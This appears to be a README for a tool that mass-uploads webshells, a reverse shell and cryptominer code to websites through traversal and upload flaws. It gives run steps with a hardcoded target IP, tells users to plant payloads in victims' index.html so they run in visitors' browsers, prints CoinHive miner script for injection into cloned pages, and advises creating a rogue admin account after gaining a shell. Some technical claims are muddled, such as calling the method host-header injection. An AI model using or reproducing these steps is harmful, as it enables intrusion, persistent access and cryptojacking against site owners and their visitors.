# Tropical Cumblast - A easy-mode, webshell/reverse-shell and cryptojacking malware spamming cannon

Written in under a day using

1. Python Requests


2. Needs dotdotpwn reports so it has something to parse


3. Preloaded with Weevely PHP Weaponized Webshells, one JavaScript reverse shell provided by Rapid7 and one example CoinHive Cryptominer


All it really does, is spam the living hell out of enumerated file upload vulnerabilities and path permissions issues that should have been taken care of by their administrators.

This is also known as host-header injection.

How it works is...

1. Reads a list of known directory traversal vulns from a wordlist
2. Generates a gigantic list of HTTP GET/POST/PUT requests,
3. Hammers the router with it for half an hour
4. And find out which one of the payloads made it.

You want to be looking at a traversal vulnerablity. that throws a code 302 or lower. That is the only chance we have at getting a stable shell to immediately work with.

Be warned, that it's quite tough. The first thing you should do if you land a shell is immediately get out of the environment, escalate your privileges and add yourself as a new username="admin". This app was specifically designed to launch Weevely PHP payloads, in both it's raw execuable form and as a embedded malware component on webpages.

# Installing and running it.

As long as you have dotdotpwn and some form of a reverse or web shell, then you are already ready to go.

1. Generate a wordlist of scanning results via dotdotpwn. dotdotpwn -m http -h http://ip.addr.ip.v4:80
2. Save the terminal results and change the value of 

**list_of_injectable_links** = "/root/dumppvulns.log"


**target** = "http://104.27.155.158:80"


**payload** = "thumbnails.php"

Then you need to generate some payloads. Be sure to take the shellcode and replace the values of these with it...

**raw_nodejs** = """
<html lang="en" dir="ltr">
    <meta charset="utf-8">
    <script type="text/javascript">
    </script>
    
**html_embedded_payload_buffer** = """
<html lang="en" dir="ltr">
    <meta charset="utf-8">
<script type="text/php">
    </script>
  
 # And remember to select your payload by changing the value of this.
 
**payload_buffer** = html_embedded_payload_buffer


With someone's index.html in the root web directory, with rwx permissions, then the payload will definitely go off even if its embedded as script tags in the html webpage. 

If someone loads your website. It goes off. Inside of THEIR webbrowser. And if they were to escape the sandbox of the web browser, then they got a lot to worry about.

# This already is working with...

1. Three working payloads from

      a. A Weevely PHP Penetration Testing Webshell
      b. A embedded PHP of that variant inside of a file called index.htm (it is created when the attack starts) due to the nature of POST requests
      c. A NodeJS Metasploit reverse shell, easily upgradable to Meterpreter.
  
Shell injection vulnerabilities are in fact, disturbingly common. If you own a wordpress, try running this against it to audit it.

# Official Steps

1. Generate a vulnerability report with dotdotpwn
2. Generate your own payloads using Weevely, Metasploit, Pupy, CoinHive, etc.
3. Load all of the obfuscated code into the script urlinjector.py

Point your cannon at whatever unsecured domain you found, and let it rip! Keep your reverse shell listeners running at ALL TIMES. If a web app payload embedded into a webpage snares someone, their reverse shell will be connecting IMMEDIATELY.
# Frighteningly enough, you can even blast websites with persistent cryptominers on it.

First make a account on CoinHive. https://coinhive.com/. Don't forget to get yourself a web wallet too for the Monero you'll be making.

Then take a look at the CONSENSUAL MINER CODE and merely replace the source web app link as so.

```
<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
<div class="coinhive-miner" 
	style="width: 256px; height: 310px"
	data-key="YOUR_SITE_KEY">
	<em>Loading...</em>
</div>
```
Here is the completed work. All you need to do is switch the src javascript file and add your official CoinHive key. Be sure to encrypt it when you actually use this blaster.

```
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script>
  	var miner = new CoinHive.Anonymous('mPVwGCQgKvckboARWHMIe3CYLTISHSzU', {throttle: 0.3});

  	// Only start on non-mobile devices and if not opted-out
  	// in the last 14400 seconds (4 hours):
  	if (!miner.isMobile() && !miner.didOptOut(14400)) {
  		miner.start();
  	}
  </script>
```

Finally you want to enclose it with a ordinary webpage's syntax

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
<div class="coinhive-miner"
	style="width: 256px; height: 310px"
	data-key="YOUR_SITE_KEY">
	<em>Loading...</em>
</div>
  </body>
</html>
```

Or just download someone else's page with wget or httrack and then slip this code in there before loading it into the cannon.


